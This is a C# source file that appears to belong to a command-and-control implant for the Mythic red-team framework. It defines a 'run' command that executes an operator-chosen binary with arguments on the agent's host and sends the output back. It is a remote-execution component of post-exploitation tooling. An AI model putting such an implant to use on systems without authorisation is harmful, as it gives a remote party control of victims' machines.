using Models.Tasks;

using Extend;

using System.Text;

namespace Tasks.Commands
{
    public class Run : CerberusCommand
    {
        public override string Name => "run";

        public override MythicTaskResult Execute(MythicTask task)
        {
            MythicTaskResult result;

            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<RunParam>();

            if (Arguments is null || Arguments.binary is null)
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "No arguments supplied. Must supply file to execute and any required arguments",
                    completed = true,
                    status = "Error",
                    error = "No arguments supplied. Must supply file to execute and any required arguments"
                };

                return result;
            }

            result = new MythicTaskResult
            {
                task_id = task.id,
                user_output = Internal.Execute.ExecuteCommand(Arguments.binary, Arguments.arguments),
                completed = true,
                status = "success"
            };

            return result;
        }
    }

    public class RunParam
    {
        public string binary { get; set; }
        public string arguments { get; set; }
    }
}
